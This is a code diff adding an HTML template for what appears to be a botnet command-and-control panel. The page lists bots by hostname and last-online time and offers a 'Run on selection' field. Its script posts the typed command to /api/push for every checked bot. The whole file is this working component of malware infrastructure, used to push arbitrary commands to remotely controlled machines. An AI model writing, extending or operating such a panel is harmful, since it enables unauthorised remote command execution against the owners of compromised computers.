@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    <link rel="stylesheet" type="text/css" href="/static/css/stylesheet.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="/static/css/github-dark.css" media="screen">
+    <title>Bot list</title>
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>Bot list</h1>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+
+          <label for="cmd">Run on selection</label><br>
+          <input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" style="width:50%" />
+          <button type="submit" onclick="send_command()">Send</button>
+
+          <table>
+          <tr><th>Name (hostname)</th><th>Last Online</th><th>Sel.</th></tr>
+          {{bot_table}}
+          </table>
+
+    </section>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+  <script>
+  function keypressed(e){
+      if(e.keyCode === 13){
+          send_command();
+      }
+      return false;
+  }
+  function send_command(e) {
+      $(".botid:checked").each(function(){
+          $.post("/api/push", {'botid': $(this).attr('id'), 'cmd': $('#cmd').val()});
+      });
+      $('#cmd').val('');
+      return false;
+  }
+  </script>
+  </body>
+</html>
